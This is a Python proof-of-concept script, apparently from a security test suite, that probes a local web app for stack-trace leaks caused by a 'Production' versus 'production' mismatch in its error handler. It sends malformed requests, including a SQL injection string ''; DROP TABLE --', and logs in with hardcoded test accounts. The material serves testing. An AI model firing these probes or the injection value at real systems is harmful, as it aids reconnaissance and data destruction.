#!/usr/bin/env python3
"""
WSTG-ERRH-02: Stack Trace Leak Due to Case-Sensitivity Bug

Vulnerability: The error handler in middleware/errorHandler.js has a
case-sensitivity bug in its production check:

    if (process.env.NODE_ENV !== 'Production') {
        response.stack = err.stack;
    }

The standard NODE_ENV value is 'production' (lowercase), but the code
checks for 'Production' (capitalized). This means even in production
environments, stack traces are always leaked because 'production' !== 'Production'.

Stack traces expose:
- Internal file paths and directory structure
- Function names and call chains
- Library versions and dependencies
- Database query details
- Node.js internals

Impact: Information disclosure. Stack traces help attackers understand the
application architecture, identify vulnerable dependencies, and craft
more targeted attacks.
"""

import requests
import json
import sys

BASE_URL = "http://localhost:3000"
CLIENT_ACCOUNTS = [
    {"email": "testclient@hireflow.com", "password": "password123"},
    {"email": "mark.stevens@techvault.io", "password": "password123"},
    {"email": "lisa.chen@brightpath.com", "password": "password123"},
]


def try_login(accounts):
    for creds in accounts:
        resp = requests.post(f"{BASE_URL}/api/auth/login", json=creds)
        if resp.status_code == 200:
            return resp.json()["token"], resp.json()["user"]
    return None, None


def main():
    print("=" * 70)
    print("WSTG-ERRH-02: Stack Trace Leak - Case-Sensitivity Bug in Error Handler")
    print("=" * 70)

    # Step 1: Trigger a 500 error with malformed input
    print("\n[1] Triggering errors with malformed requests...\n")

    stack_leaked = False

    # Test 1: Invalid UUID in user endpoint
    print("    Test 1: Invalid UUID format in GET /api/users/not-a-uuid/settings")
    resp = requests.get(f"{BASE_URL}/api/users/not-a-real-uuid-format/settings")
    print(f"    Status: {resp.status_code}")
    try:
        data = resp.json()
        if "stack" in data:
            stack_leaked = True
            print(f"    [VULNERABLE] Stack trace leaked!")
            stack_preview = data["stack"][:300]
            print(f"    Stack (first 300 chars):")
            for line in stack_preview.split("\n")[:5]:
                print(f"      {line}")
        else:
            print(f"    Response keys: {list(data.keys())}")
    except:
        print(f"    Response: {resp.text[:200]}")

    # Test 2: SQL injection that causes an error
    print("\n    Test 2: Malformed SQL via search parameter")
    resp2 = requests.get(f"{BASE_URL}/api/users", params={"search": "' ; DROP TABLE --"})
    print(f"    Status: {resp2.status_code}")
    try:
        data2 = resp2.json()
        if "stack" in data2:
            stack_leaked = True
            print(f"    [VULNERABLE] Stack trace leaked!")
            stack_lines = data2["stack"].split("\n")[:5]
            for line in stack_lines:
                print(f"      {line}")
        else:
            print(f"    Response keys: {list(data2.keys())}")
    except:
        print(f"    Response: {resp2.text[:200]}")

    # Test 3: Login and trigger authenticated errors
    print("\n    Test 3: Invalid contract ID (needs auth)")
    token, user = try_login(CLIENT_ACCOUNTS)
    if token:
        headers = {"Authorization": f"Bearer {token}"}

        resp3 = requests.get(
            f"{BASE_URL}/api/contracts/not-a-valid-id",
            headers=headers
        )
        print(f"    Status: {resp3.status_code}")
        try:
            data3 = resp3.json()
            if "stack" in data3:
                stack_leaked = True
                print(f"    [VULNERABLE] Stack trace leaked!")
                stack_lines = data3["stack"].split("\n")[:5]
                for line in stack_lines:
                    print(f"      {line}")
            else:
                print(f"    Response keys: {list(data3.keys())}")
        except:
            print(f"    Response: {resp3.text[:200]}")

    # Test 4: Malformed JSON body
    print("\n    Test 4: Malformed request body to payment endpoint")
    if token:
        resp4 = requests.post(
            f"{BASE_URL}/api/payments/wallet/deposit",
            data="this is not json",
            headers={
                "Authorization": f"Bearer {token}",
                "Content-Type": "application/json"
            }
        )
        print(f"    Status: {resp4.status_code}")
        try:
            data4 = resp4.json()
            if "stack" in data4:
                stack_leaked = True
                print(f"    [VULNERABLE] Stack trace leaked!")
                stack_lines = data4["stack"].split("\n")[:3]
                for line in stack_lines:
                    print(f"      {line}")
        except:
            print(f"    Response: {resp4.text[:200]}")

    # Test 5: Invalid escrow milestone ID
    print("\n    Test 5: Invalid milestone ID in escrow endpoint")
    if token:
        resp5 = requests.post(
            f"{BASE_URL}/api/payments/escrow/fund/invalid-milestone-id",
            headers=headers
        )
        print(f"    Status: {resp5.status_code}")
        try:
            data5 = resp5.json()
            if "stack" in data5:
                stack_leaked = True
                print(f"    [VULNERABLE] Stack trace leaked!")
                stack_lines = data5["stack"].split("\n")[:5]
                for line in stack_lines:
                    print(f"      {line}")
        except:
            print(f"    Response: {resp5.text[:200]}")

    # Step 2: Explain the bug
    print(f"\n[2] Root cause analysis:")
    print(f"    In middleware/errorHandler.js:")
    print(f"    ")
    print(f"      if (process.env.NODE_ENV !== 'Production') {{")
    print(f"          response.stack = err.stack;")
    print(f"      }}")
    print(f"    ")
    print(f"    The check uses 'Production' (capital P), but the standard")
    print(f"    NODE_ENV value in production is 'production' (lowercase).")
    print(f"    Since 'production' !== 'Production', the stack trace is ALWAYS")
    print(f"    included in error responses, even in production.")

    # Step 3: Check what environment the app reports
    print(f"\n[3] Checking reported environment...")
    resp_debug = requests.get(f"{BASE_URL}/api/debug/info")
    if resp_debug.status_code == 200:
        env = resp_debug.json().get("environment", "N/A")
        print(f"    NODE_ENV: '{env}'")
        if env == "production":
            print(f"    Even though NODE_ENV='production', stack traces leak")
            print(f"    because the code checks for 'Production' (capital P)!")
        elif env == "development":
            print(f"    In development mode - stacks would leak regardless.")
            print(f"    But the bug means they'd leak in production too.")

    # Summary
    print("\n" + "=" * 70)
    print("RESULT: Stack trace leak confirmed.")
    if stack_leaked:
        print("  - Stack traces are included in error responses")
        print("  - Case-sensitivity bug: 'Production' vs 'production'")
        print("  - Exposes internal file paths, function names, dependencies")
        print("  - Helps attackers map application internals")
    else:
        print("  - No stack traces observed in responses")
        print("  - The code bug exists but may not have triggered 500 errors")
    print("=" * 70)


if __name__ == "__main__":
    main()
